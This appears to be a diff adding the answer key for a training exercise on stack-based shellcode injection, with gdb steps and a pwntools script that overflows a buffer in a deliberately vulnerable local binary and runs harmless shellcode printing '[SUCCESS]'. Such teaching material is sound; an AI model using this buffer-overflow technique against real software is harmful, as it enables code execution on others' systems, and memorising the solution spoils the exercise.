@@ -1,0 +1,38 @@
+Solution — Exercise 02: Shellcode Injection
+=============================================
+
+Step 1: Get the buffer address
+  gdb ./target
+  break vulnerable
+  run
+  p &buffer
+  → e.g. 0x7fffffffe020
+
+Step 2: Write the exploit (using pwntools)
+  from pwn import *
+  context.arch = 'amd64'
+
+  # Shellcode: write(1, "[SUCCESS]\n", 10)
+  sc = asm(shellcraft.write(1, '[SUCCESS]\n', 10))
+
+  buf_addr = 0x7fffffffe020  # your address from gdb
+
+  nop_sled  = b'\x90' * 32
+  shellcode = sc
+  padding   = b'A' * (64 + 8 - len(nop_sled) - len(shellcode))
+  ret_addr  = struct.pack('<Q', buf_addr + 16)  # aim into the NOP sled
+
+  payload = nop_sled + shellcode + padding + ret_addr
+
+  with open('payload', 'wb') as f:
+      f.write(payload)
+
+  Then: ./target < payload
+
+Step 3: Run it
+  python3 exploit.py && ./target < payload
+
+Why it works:
+  With -z execstack, memory on the stack is executable.
+  We overflow the return address to point back into our buffer,
+  where the CPU begins executing our shellcode directly.
